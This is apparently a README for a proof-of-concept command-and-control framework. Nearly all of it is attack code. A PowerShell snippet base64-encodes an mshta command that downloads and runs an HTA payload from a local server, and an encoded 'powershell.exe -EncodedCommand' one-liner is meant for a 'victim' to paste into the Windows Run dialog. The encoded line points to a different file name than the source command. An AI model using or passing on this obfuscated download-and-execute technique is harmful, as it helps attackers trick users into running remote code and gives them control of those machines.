# Command And Control Framework POC

## Encode the command

```
$Command = 'mshta http://localhost:3000/static/victim.hta'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
[Convert]::ToBase64String($Bytes)
```

## Victim to Run to command by launching 🪟 + R

Example
```
powershell.exe -EncodedCommand bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADMAMAAwADAALwBzAHQAYQB0AGkAYwAvAGEAcABwAC4AaAB0AGEA
```
